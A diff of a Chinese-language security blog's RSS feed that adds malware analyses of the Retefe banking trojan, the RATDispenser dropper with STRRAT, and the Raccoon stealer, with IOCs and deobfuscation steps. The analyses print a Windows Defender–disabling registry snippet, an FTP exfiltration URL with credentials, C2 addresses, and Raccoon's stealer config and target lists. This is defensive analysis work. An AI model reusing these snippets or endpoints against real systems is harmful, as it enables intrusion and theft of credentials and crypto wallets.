@@ -5,8 +5,654 @@
 		<description>Recent content in Mediums on alee</description>
 		<generator>Hugo -- gohugo.io</generator>
 		<language>zh-cn</language>
-		<lastBuildDate>Thu, 06 Jan 2022 09:10:58 +0800</lastBuildDate>
+		<lastBuildDate>Mon, 28 Mar 2022 13:59:05 +0800</lastBuildDate>
 		<atom:link href="https://www.a1ee.cn/medium/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Retefe</title>
+			<link>https://www.a1ee.cn/medium/retefe/</link>
+			<pubDate>Mon, 28 Mar 2022 13:59:05 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/medium/retefe/</guid>
+			<description>Retefe 样本分析 样本信息 Retefe是一种Windows银行木马，它还可以使用Windows PowerShell将其他恶意软件下载并安装到系统上。</description>
+			<content type="html"><![CDATA[<h1 id="retefe-样本分析">Retefe 样本分析</h1>
+<h2 id="样本信息">样本信息</h2>
+<p><code>Retefe</code>是一种<code>Windows</code>银行木马，它还可以使用<code>Windows PowerShell</code>将其他恶意软件下载并安装到系统上。它的主要功能是协助攻击者窃取网上银行网站的凭据。它通常针对瑞士银行。恶意软件二进制文件本身主要是一个<code>Javascript</code>文件的释放器组件，该文件构建一个<code>PowerShell</code>文件，该文件又将多个工具加载到主机上，包括：<code>7zip</code>和<code>TOR</code>。<code>PowerShell</code>安装一个新的根证书，然后通过<code>TOR</code>将所有流量转发到攻击者控制的主机，以有效地进行<code>MITM TLS</code>流量。</p>
+<p><strong>IOC</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类别</th>
+<th style="text-align:left">特征值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">SHA256</td>
+<td style="text-align:left">9bdc837b0ecdf2aac509e33b52531ac5d95b12558b71db8083b044afc7aedf94</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA1</td>
+<td style="text-align:left">f0a8c72af4f0a8656f7b2fc53f64b2fa6a6a42b6</td>
+</tr>
+<tr>
+<td style="text-align:left">MD5</td>
+<td style="text-align:left">9b8771374f02f0357e23b312b6793a86</td>
+</tr>
+</tbody>
+</table>
+<h2 id="样本分析">样本分析</h2>
+<p>样本是一个<code>Javascript</code>文件，文件经过了一些混淆，但<code>eval</code>函数很明显：</p>
+<p><img src="/retefe_images/367224816226655.png" alt=""></p>
+<p>通过构建一个本地包含文件来打印<code>eval</code>函数的加载内容：</p>
+<p><img src="/retefe_images/184185016246821.png" alt=""></p>
+<p>测试用的<code>js</code>中则将<code>eval</code>替换成<code>console.log</code>：</p>
+<p><img src="/retefe_images/431135116239490.png" alt=""></p>
+<p>然后我们就得到了一个隐藏的代码：</p>
+<p><img src="/retefe_images/207135216236045.png" alt=""></p>
+<p>从结构上看，这部分代码也是一个<code>eval</code>加载：</p>
+<p><img src="/retefe_images/269222009220363.png" alt=""></p>
+<p>同样的以<code>console.log</code>替换<code>eval</code>，我们得到了第二份加载代码：</p>
+<p><img src="/retefe_images/423882109238789.png" alt=""></p>
+<p>这个部分也是同样的<code>eval</code>：</p>
+<p><img src="/retefe_images/388592209226656.png" alt=""></p>
+<p>同样的以<code>console.log</code>替换<code>eval</code>，我们得到了第三份加载代码：</p>
+<p><img src="/retefe_images/257712309246822.png" alt=""></p>
+<p>第三份加载看起来正常多了，我们将其美化一下：</p>
+<p><img src="/retefe_images/20001610231800.png" alt=""></p>
+<p>里面包含了一些<code>base64</code>编码的内容，和一些函数类。</p>
+<p><code>Help</code>中提供二进制文件写入、随机数生成、随机字符串生成、字符过滤：</p>
+<p><img src="/retefe_images/176803010249680.png" alt=""></p>
+<p><code>C_IE</code>类提供了针对网络设置的一些功能：</p>
+<p><img src="/retefe_images/293193210247284.png" alt=""></p>
+<p>通过访问以下站点获取本机的公网<code>IP</code>：</p>
+<pre tabindex="0"><code>http://api.ipify.org/
+http://icanhazip.com/
+</code></pre><p>修改注册表<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoDetect</code>为<code>0</code>，关闭自动检测脚本；</p>
+<p>配置注册表<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL</code>为<code>http://127.0.0.1:5555/{Help.GenStr(8)}.js?ip={GetIp()}</code>，设置代理脚本。</p>
+<p>其中存在一条赋值命令：<code>var bData = Base64.decode(arrayList.ps);</code>，然后将其保存在<code>%TEMP%</code>路径下，调用<code>powershell -ep Unrestricted -f</code>执行，<code>Base64.decode(arrayList.ps)</code>解密后代码如下：</p>
+<p><img src="/retefe_images/63342114226027.png" alt=""></p>
+<p>该<code>powershell</code>脚本的主要功能是证书添加：</p>
+<p><img src="/retefe_images/501172014244786.png" alt=""></p>
+<p>添加的证书则是<code>arrayList.cert</code>的解密内容：</p>
+<p><img src="/retefe_images/117832214248467.png" alt=""></p>
+<p>接下来是针对<code>firefox</code>的脚本配置：</p>
+<p><img src="/retefe_images/597272714243603.png" alt=""></p>
+<p>同样存在一个本地文件生成及执行：</p>
+<p><img src="/retefe_images/597362814237149.png" alt=""></p>
+<p>解密后的主要功能也是证书导入：</p>
+<p><img src="/retefe_images/328063114230283.png" alt=""></p>
+<p>导入函数与<code>IE</code>略有不同：</p>
+<p><img src="/retefe_images/169743314220813.png" alt=""></p>
+<p><code>C_TP</code>类同样是生成<code>powershell</code>脚本并执行：</p>
+<p><img src="/retefe_images/435210515223317.png" alt=""></p>
+<p>脚本功能则是下载<code>7zip</code>、<code>TOR</code>和<code>socat</code>，然后用<code>socat</code>转发流量到<code>tor</code>；</p>
+<p>下载 <code>7zip</code>：<code>https://chocolatey.org/7za.exe</code></p>
+<p><img src="/retefe_images/508333415225758.png" alt=""></p>
+<p>下载<code>taskscheduler</code>：<code>https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg</code></p>
+<p><img src="/retefe_images/493634415252713.png" alt=""></p>
+<p>函数执行流程：</p>
+<p><img src="/retefe_images/152260915232264.png" alt=""></p>
+<p><code>tor</code>下载地址如下：</p>
+<pre tabindex="0"><code>https://torproject.urown.net/dist/torbrowser/7.0.6/tor-win32-0.3.1.7.zip
+https://dist.torproject.org/torbrowser/7.0.6/tor-win32-0.3.1.7.zip
+https://torproject.mirror.metalgamer.eu/dist/torbrowser/7.0.6/tor-win32-0.3.1.7.zip
+https://tor.ybti.net/dist/torbrowser/7.0.6/tor-win32-0.3.1.7.zip
+</code></pre><p><code>sockt</code>下载地址如下：</p>
+<pre tabindex="0"><code>https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip
+</code></pre><p><code>DOMAIN</code>列表如下：</p>
+<pre tabindex="0"><code>igs67efmlcucq57u.onion
+jotetnnmfzb42sdw.onion
+ou47twzxgnicn7ga.onion
+aulqkm5upaqmto3i.onion
+</code></pre><p>在整个调用过程中，依次执行了浏览器进程杀死，安装证书，检查安装情况并上传<code>log</code>：</p>
+<p><img src="/retefe_images/532925715234926.png" alt=""></p>
+<p>在<code>Func_LOG</code>函数中存在一处解密<code>arrayList.pslog</code>的行为，最终解密后的核心代码如下：</p>
+<p><img src="/retefe_images/502285915224224.png" alt=""></p>
+<p><code>CheckInstall</code>函数主要功能为收集当前主机信息，检查浏览器代理脚本情况：</p>
+<p><img src="/retefe_images/45160116220475.png" alt=""></p>
+<p><code>UploadLog</code>函数则是上传日志到目标<code>FTP</code>服务器：<code>ftp://rolf.buehlmann:Ridima65@82.220.2.66/web/sxerzere</code></p>
+<p><img src="/retefe_images/308920216220614.png" alt=""></p>
+<h2 id="参考资料">参考资料</h2>
+<pre tabindex="0"><code>https://app.any.run/tasks/741aa9bc-8dce-44a9-b806-01f1b1f92cdd/
+https://www.youtube.com/watch?v=g8_t1WfObok
+</code></pre>]]></content>
+		</item>
+		
+		<item>
+			<title>RATDispenser&#43;STRRAT</title>
+			<link>https://www.a1ee.cn/medium/ratdispenser&#43;strrat/</link>
+			<pubDate>Mon, 28 Mar 2022 13:53:10 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/medium/ratdispenser&#43;strrat/</guid>
+			<description>RATDispenser + STRRAT 样本分析 样本信息 RATDispenser用于在启动辅助恶意软件以建立对受感染设备的控制之前在系统上获得初始立足点。调查发现RATDis</description>
+			<content type="html"><![CDATA[<h1 id="ratdispenser--strrat-样本分析">RATDispenser + STRRAT 样本分析</h1>
+<h2 id="样本信息">样本信息</h2>
+<p><code>RATDispenser</code>用于在启动辅助恶意软件以建立对受感染设备的控制之前在系统上获得初始立足点。调查发现<code>RATDispenser</code>主要用作投放器（在 94% 的分析样本中），这意味着恶意软件不会通过网络通信来传递恶意负载。恶意软件家族的多样性（其中许多可以从地下市场免费购买或下载），以及恶意软件运营商放弃其有效载荷的偏好，表明<code>RATDispenser</code>的作者可能在恶意软件即服务的商业模式下运营。</p>
+<p>本次分析的<code>RATDispenser</code>样本释放的是<code>STRRAT</code>恶意载荷，<code>STRRAT</code>是一种基于<code>Java</code>的<code>RAT</code>，它广泛使用插件来为攻击者提供完全的远程访问，以及凭据窃取、密钥记录和其他插件。<code>RAT</code>的重点是通过键盘记录窃取浏览器和电子邮件客户端的凭据以及密码。</p>
+<p><strong>ioc</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类别</th>
+<th style="text-align:left">特征值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">MD5</td>
+<td style="text-align:left">57f40bda9c26cac45157ae7502cceecd</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA1</td>
+<td style="text-align:left">6af4aa184cb1eb93feb2f3c75cd482fab518c316</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA256</td>
+<td style="text-align:left">026b19fdc75b76cd696be8a3447a5d23a944a7f99000e7fae1fa3f6148913ff3</td>
+</tr>
+<tr>
+<td style="text-align:left">C2</td>
+<td style="text-align:left">147.182.174.188 [str-master.pw]</td>
+</tr>
+</tbody>
+</table>
+<h2 id="样本分析">样本分析</h2>
+<h3 id="样本释放">样本释放</h3>
+<p>该样本采用的是外挂<code>js</code>形式，打开<code>js</code>代码可以看到一些混淆和解密函数：</p>
+<p><img src="/ratdispenser+strrat_images/330631410220355.png" alt=""></p>
+<p>为了便于阅读，首先美化一下代码：</p>
+<p><img src="/ratdispenser+strrat_images/446622910238781.png" alt=""></p>
+<p>从其中提取出核心代码，可以看到最终解密出来的内容如下：</p>
+<p><img src="/ratdispenser+strrat_images/459573210226648.png" alt=""></p>
+<h3 id="二次释放">二次释放</h3>
+<p>按照执行流程将进行一次<code>base64解码</code>然后用<code>eval</code>加载到内存中，解码后美化得出如下数据：</p>
+<p><img src="/ratdispenser+strrat_images/146293610246814.png" alt=""></p>
+<p>首先会新建一个脚本文件用于关闭<code>Windows Defender</code>：</p>
+<pre tabindex="0"><code>Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender]
+&#34;DisableAntiSpyware&#34;=dword:00000001
+</code></pre><p><img src="/ratdispenser+strrat_images/16173316247278.png" alt=""></p>
+<p>然后解密释放本地文件到<code>%temp%</code>、<code>%appdata%</code>：</p>
+<p><img src="/ratdispenser+strrat_images/478242616220356.png" alt=""></p>
+<h3 id="strrat-分析">STRRAT 分析</h3>
+<p>最终获取到随机命名的<code>jar</code>文件：</p>
+<p><img src="/ratdispenser+strrat_images/76883316226649.png" alt=""></p>
+<h4 id="反混淆">反混淆</h4>
+<p>其中大量引用了<code>StringBuilder()</code>符合<code>STRRAT</code>特征，由于字符串经过了混淆，接下来使用<a href="https://github.com/java-deobfuscator/deobfuscator">java-deobfuscator</a>进行反混淆。</p>
+<p>首先新建一个<code>detect.yml</code>来设定检测路径：</p>
+<pre tabindex="0"><code>input: xskush.jar
+detect: true
+</code></pre><p>然后使用命令：<code>java -jar deobfuscator.jar --config detect.yml</code> ，检测混淆方式：</p>
+<p><img src="/ratdispenser+strrat_images/234154316246815.png" alt=""></p>
+<p>从上面可以得出混淆方式为：<code>com.javadeobfuscator.deobfuscator.transformers.allatori.StringEncryptionTransformer</code></p>
+<p>新建一个<code>config.yml</code>，指定输出文件名及混淆方式：</p>
+<pre tabindex="0"><code>input: xskush.jar
+output: xskush_output.jar
+transformers:
+  - com.javadeobfuscator.deobfuscator.transformers.allatori.StringEncryptionTransformer
+</code></pre><p>执行命令：<code>java -jar deobfuscator.jar --config config.yml</code>，生成去混淆后的文件：</p>
+<p><img src="/ratdispenser+strrat_images/350844017239484.png" alt=""></p>
+<h4 id="分析">分析</h4>
+<p>在<code>main</code>函数中，会检测部分<code>jar</code>文件是否存在：</p>
+<p><img src="/ratdispenser+strrat_images/32752115220357.png" alt=""></p>
+<p>寻找上下文发现其下载链接如下：</p>
+<pre tabindex="0"><code>https://repo1.maven.org/maven2/net/java/dev/jna/jna/5.5.0/jna-5.5.0.jar
+https://repo1.maven.org/maven2/net/java/dev/jna/jna-platform/5.5.0/jna-platform-5.5.0.jar
+https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.14.2.1/sqlite-jdbc-3.14.2.1.jar
+https://github.com/kristian/system-hook/releases/download/3.5/system-hook-3.5.jar
+</code></pre><p><img src="/ratdispenser+strrat_images/27712215238783.png" alt=""></p>
+<p>向下发现<code>C2</code>节点配置代码，由于<code>arrayOfString1</code>为空，最终的<code>C2</code>为<code>http://str-master.pw/strigoi/server/ping.php?lid=***</code>：</p>
+<p><img src="/ratdispenser+strrat_images/189973215226650.png" alt=""></p>
+<p>观察其它类，发现了一些命令执行代码：</p>
+<p><img src="/ratdispenser+strrat_images/300105215246816.png" alt=""></p>
+<p>获取进程和启动文件列表，窃取缓存密码等等操作：</p>
+<p><img src="/ratdispenser+strrat_images/85945315239485.png" alt=""></p>
+<p>还配备了按键记录：</p>
+<p><img src="/ratdispenser+strrat_images/168015415236040.png" alt=""></p>
+<p>操作注册表功能：</p>
+<p><img src="/ratdispenser+strrat_images/95325515231794.png" alt=""></p>
+<p>获取空闲时间：</p>
+<p><img src="/ratdispenser+strrat_images/266725515249674.png" alt=""></p>
+<h2 id="参考资料">参考资料</h2>
+<pre tabindex="0"><code>https://threatresearch.ext.hp.com/javascript-malware-dispensing-rats-into-the-wild/
+https://www.jaiminton.com/reverse-engineering/strrat#
+https://app.any.run/tasks/0c4909de-827d-4164-9ee8-0cbffe97aef5/
+</code></pre>]]></content>
+		</item>
+		
+		<item>
+			<title>Raccoon</title>
+			<link>https://www.a1ee.cn/medium/raccoon/</link>
+			<pubDate>Mon, 28 Mar 2022 13:49:48 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/medium/raccoon/</guid>
+			<description>Raccoon 样本分析 1. 样本信息 Raccoon是一种信息窃取类型恶意软件，可作为恶意软件即服务使用。它可以通过订阅获得，每月收费 200 美元。Raccoon恶</description>
+			<content type="html"><![CDATA[<h1 id="raccoon-样本分析">Raccoon 样本分析</h1>
+<h2 id="1-样本信息">1. 样本信息</h2>
+<p><code>Raccoon</code>是一种信息窃取类型恶意软件，可作为恶意软件即服务使用。它可以通过订阅获得，每月收费 200 美元。<code>Raccoon</code>恶意软件已经感染了超过 100,000 台设备，并成为 2019 年地下论坛上被提及最多的病毒之一。</p>
+<p><strong>ioc</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类别</th>
+<th style="text-align:left">特征值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">MD5</td>
+<td style="text-align:left">f1521ff38743ca05cc8c6f25cd95309c</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA1</td>
+<td style="text-align:left">ebb54174674901b68474ae44944fbe5283d56398</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA256</td>
+<td style="text-align:left">1a79ac5d13c3c8ab8fc5b8d7e512065f512a2d81e61b199902a0ad0f380a2256</td>
+</tr>
+<tr>
+<td style="text-align:left">C2</td>
+<td style="text-align:left">91.219.236.49</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2-样本分析">2. 样本分析</h2>
+<h3 id="21-空间申请">2.1. 空间申请</h3>
+<p><code>ida</code>载入样本，从主函数往下发现其调用<code>GlobalAlloc</code>在堆中申请空间：</p>
+<p><img src="/raccoon_images/272533116226447.png" alt=""></p>
+<p>通过计算或动态调试可知<code>sizeBytes</code>大小为<code>0x4DBD0</code>：</p>
+<p><img src="/raccoon_images/201873516239282.png" alt=""></p>
+<h3 id="22-数据拷贝">2.2. 数据拷贝</h3>
+<p>然后会将本地<code>0x407B58</code>地址处的数据逐字节拷贝到刚才申请的堆空间中：</p>
+<p><img src="/raccoon_images/235383816235837.png" alt=""></p>
+<p>数据的内容如下：</p>
+<p><img src="/raccoon_images/443304016231591.png" alt=""></p>
+<h3 id="23-修改虚拟空间保护">2.3. 修改虚拟空间保护</h3>
+<p>通过<code>GetProcAddress</code>获取<code>kernel32.dll</code>中<code>&amp;byte_479098</code>字符串的函数地址，然后调用该函数使申请的堆空间可读可写可执行。<code>&amp;byte_479098</code>所对应的字符串可通过计算或动态调试得知为<code>VirtualProtect</code>：</p>
+<p><img src="/raccoon_images/393444516249471.png" alt=""></p>
+<h3 id="24-解密释放数据">2.4. 解密释放数据</h3>
+<p><code>handleAddress</code>处拷贝的数据进行解密后，便跳转到<code>handleAddress</code>进行执行：</p>
+<p><img src="/raccoon_images/463394814238581.png" alt=""></p>
+<p>解密方式如下：</p>
+<p><img src="/raccoon_images/120514814220155.png" alt=""></p>
+<h3 id="25-第一次执行虚拟内存代码">2.5. 第一次执行虚拟内存代码</h3>
+<p>在申请内存空间时，空间句柄保存在<code>handleAddress</code>中，当解密完数据后，<code>EIP</code>将指向<code>handleAddress</code>（因申请空间存在随机性，复现时内存地址亦存在差异）：</p>
+<p><img src="/raccoon_images/416212115239283.png" alt=""></p>
+<p>通过动态调试跟踪执行，发现第一个<code>call</code>函数的主要功能是获取<code>API</code>函数地址：<code>GlobalAlloc</code>、<code>GetLastError</code>、<code>Sleep</code>、<code>VirtualAlloc</code>、<code>CreateToolhelp32Snapshot</code>、<code>Module32First</code>、<code>CloseHandle</code>；第二个<code>call</code>函数则包含了一些有趣的东西：</p>
+<p><img src="/raccoon_images/238080310220158.png" alt=""></p>
+<p>在内存<code>dataAddress</code>中存在一个加密数据块，其中存储着恶意代码，下方第一个红框则是对该部分的密钥进行计算，第二个红框是解密过程（获取密钥再<code>xor</code>解密），第三个红框是判断是否全部解密（解密长度大小为<code>0x4D1F1</code>）：</p>
+<p><img src="/raccoon_images/93741010238584.png" alt=""></p>
+<p>当解密完成后，<code>dataAddress</code>数据块内容如下：</p>
+<p><img src="/raccoon_images/81982110226451.png" alt=""></p>
+<p>通过<code>VirtualAlloc</code>申请一块内存<code>virtualAddress</code>，用于存储下一次解密后的数据，该解密是从<code>dataAddress</code>获取基础数据，然后解密后加载到<code>virtualAddress</code>：</p>
+<p><img src="/raccoon_images/286302410246617.png" alt=""></p>
+<p>当解密完成后，<code>virtualAddress</code>数据块内容如下：</p>
+<p><img src="/raccoon_images/174732910239286.png" alt=""></p>
+<h3 id="26-第二次执行虚拟内存代码">2.6. 第二次执行虚拟内存代码</h3>
+<p>当解密完数据后，<code>EIP</code>将指向<code>virtualAddress</code>，转入其中的代码样式如下：</p>
+<p><img src="/raccoon_images/228711311249475.png" alt=""></p>
+<p>通过动态调试发现其中存在内存申请，并将数据拷贝到申请的内存中，数据大小为<code>0x8C800</code>：</p>
+<p><img src="/raccoon_images/35581711247079.png" alt=""></p>
+<p>循环加载该<code>PE</code>文件的到<code>0x400000</code>，然后释放上一个内存空间：</p>
+<p><img src="/raccoon_images/261293711244581.png" alt=""></p>
+<p>内存布局中呈现的节区信息如下：</p>
+<p><img src="/raccoon_images/434134011225822.png" alt=""></p>
+<p>最终将跳转到<code>0x43E9BE</code>继续执行：</p>
+<p><img src="/raccoon_images/181574411248262.png" alt=""></p>
+<h3 id="27-恶意载荷分析">2.7. 恶意载荷分析</h3>
+<p>在恶意载荷内存中转拷贝过程中，将完整的<code>PE</code>文件<code>dump</code>下来进行分析，恶意载荷首先会获取当前主机用户名，创建互斥锁：</p>
+<p><img src="/raccoon_images/556711717246619.png" alt=""></p>
+<p>然后进行本地语言判断，如果是白名单区域的主机将退出：</p>
+<p><img src="/raccoon_images/443020517238586.png" alt=""></p>
+<p>提取内存中的语言白名单如下：</p>
+<pre tabindex="0"><code>Russian、Ukrainian、Belarusian、Kazakh、Kyrgyz、Armenian、Tajik、Uzbek
+</code></pre><p>恶意载荷将进行字符串拼凑及解码，本次解码获得的<code>Telegram</code>频道为<code>agrybirdsgamerept</code>：</p>
+<pre tabindex="0"><code>http://telegin.top/agrybirdsgamerept
+http://ttmirror.top/agrybirdsgamerept
+http://teletele.top/agrybirdsgamerept
+http://telegalive.top/agrybirdsgamerept
+http://toptelete.top/agrybirdsgamerept
+http://telegraf.top/agrybirdsgamerept
+https://t.me/agrybirdsgamerept
+</code></pre><p><img src="/raccoon_images/118234517239288.png" alt=""></p>
+<p>解码获得链接后，与其中一个链接（<code>http://telegin.top/agrybirdsgamerept</code>）进行通信：</p>
+<p><img src="/raccoon_images/398201716220161.png" alt=""></p>
+<p>用到的<code>WinHttpOpen</code>和<code>WinHttpConnect</code>函数：</p>
+<p><img src="/raccoon_images/263341816238587.png" alt=""></p>
+<p>解密响应内容，获得一个链接<code>http://91.219.236.49/</code>：</p>
+<p><img src="/raccoon_images/502424515246621.png" alt=""></p>
+<p>获取用户名和<code>Guid</code>：</p>
+<p><img src="/raccoon_images/92270916239290.png" alt=""></p>
+<p>然后将<code>Guid</code>与用户名加密后，发送到<code>C2</code>：</p>
+<p><img src="/raccoon_images/528492016235845.png" alt=""></p>
+<p>从响应报文中解码出一个<code>json</code>格式的字符串：</p>
+<p><img src="/raccoon_images/2411609220165.png" alt=""></p>
+<p>从内存中提取<code>json</code>文本格式如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;_id&#34;</span><span class="p">:</span> <span class="s2">&#34;4pwhxXwB3dP17SpzDPUc&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;au&#34;</span><span class="p">:</span> <span class="s2">&#34;/l/f/4pwhxXwB3dP17SpzDPUc/f986ccd7ae3990632485c23da5d654a8641da382&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ls&#34;</span><span class="p">:</span> <span class="s2">&#34;/l/f/4pwhxXwB3dP17SpzDPUc/431b842dcfe7fd233578e09291277c256e232336&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ip&#34;</span><span class="p">:</span> <span class="s2">&#34;*.*.*.*&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;location&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;country&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;country_code&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;state&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;state_code&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;city&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;zip&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;latitude&#34;</span><span class="p">:</span> <span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;longitude&#34;</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;c&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;m&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;t&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;lu&#34;</span><span class="p">:</span> <span class="kc">null</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;lu&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;rm&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;stm&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;tg&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;is_screen_enabled&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;is_history_enabled&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;depth&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;s&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;cs&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;steamstr&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;tgs&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ews&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>其中参数对应关系如下：</p>
+<ul>
+<li><code>id</code>：当前主机的编号；</li>
+<li><code>au</code>：下载<code>SQLite3.dll</code>的地址；</li>
+<li><code>ls</code>：下载窃密功能动态链接库压缩包(<code>tS1oI8aQ4.zip</code>)的地址；</li>
+<li><code>location</code>：当前主机地理位置相关信息；</li>
+<li><code>rm</code>：是否启用自我删除；</li>
+<li><code>stm</code>：是否窃取<code>Steam</code>相关信息；</li>
+<li><code>tg</code>：是否窃取<code>Telegram</code>相关信息；</li>
+<li><code>s</code>：窃取的浏览器列表；</li>
+<li><code>cs</code>：窃取的钱包列表；</li>
+<li><code>steamstr</code>：<code>Steam</code>路径；</li>
+<li><code>tgs</code>：<code>Telegram</code>路径；</li>
+<li><code>ews</code>：窃取的加密货币地址；</li>
+</ul>
+<p>被窃取的浏览器包含：</p>
+<pre tabindex="0"><code>edge、chrome、chromeBeta、chromeSxS、chromium、xpom、comodo、amigo、orbitum、bromium、brave、nichrome、rockmelt、360browser、vivaldi、go、sputnik、kometa、uran、qipSurf、epicprivacy、coccoc、centbrowser、7star、elements、torbro、suhba、saferbrowser、mustang、superbird、chedot、torch、UC Browser、QQ Browser、opera
+</code></pre><p><img src="/raccoon_images/45344509238591.png" alt=""></p>
+<p>被窃取的钱包包含：</p>
+<pre tabindex="0"><code>binance、atomic、daedalus、electrum、electrum-ltc、electroncash、exodus、green、guarda、jaxxliberty、jaxxold、mymonero、monerogui、wasabi、ledger_live
+</code></pre><p><img src="/raccoon_images/545434909226458.png" alt=""></p>
+<p><code>Steam</code>与<code>Telgram</code>的地址信息如下：</p>
+<p><img src="/raccoon_images/59305209246624.png" alt=""></p>
+<p>被窃取的加密钱包地址包含：</p>
+<pre tabindex="0"><code>meta、meta_e、brave、ronin、tronlink、bsc、MEW、guarda、Yoroi、Yoroi_e、math、math_e、equal、iwallet、jaxx、wombat、nifty、phantom、guild、saturn、liquality、terrastation、terrastation_e、keplr、neoline、polymesh、clover、sollet、iconex、temple、coin98、tezbox、khc、auromina、coinbase、cyano
+</code></pre><p><img src="/raccoon_images/253135309239293.png" alt=""></p>
+<h2 id="3-参考资料">3. 参考资料</h2>
+<pre tabindex="0"><code>https://labs.k7computing.com/index.php/raccoon-the-info-stealer/
+https://app.any.run/tasks/f877e664-3a3c-4e03-a35a-e96e079317a5/#
+https://www.virustotal.com/gui/file/1a79ac5d13c3c8ab8fc5b8d7e512065f512a2d81e61b199902a0ad0f380a2256
+</code></pre>]]></content>
+		</item>
+		
+		<item>
+			<title>MuddyWater</title>
+			<link>https://www.a1ee.cn/medium/muddywater/</link>
+			<pubDate>Mon, 28 Mar 2022 13:46:05 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/medium/muddywater/</guid>
+			<description>MuddyWater 样本分析 样本信息 MuddyWater是一个伊朗威胁组织，主要针对中东国家，也针对欧洲和北美国家。该组织的受害者主要集中在电信、政府（IT 服</description>
+			<content type="html"><![CDATA[<h1 id="muddywater-样本分析">MuddyWater 样本分析</h1>
+<h2 id="样本信息">样本信息</h2>
+<p><code>MuddyWater</code>是一个伊朗威胁组织，主要针对中东国家，也针对欧洲和北美国家。该组织的受害者主要集中在电信、政府（IT 服务）和石油部门。该组织的活动以前与<code>FIN7</code>有关联，但据信该组织是一个独特的组织，可能受到间谍活动的驱使。</p>
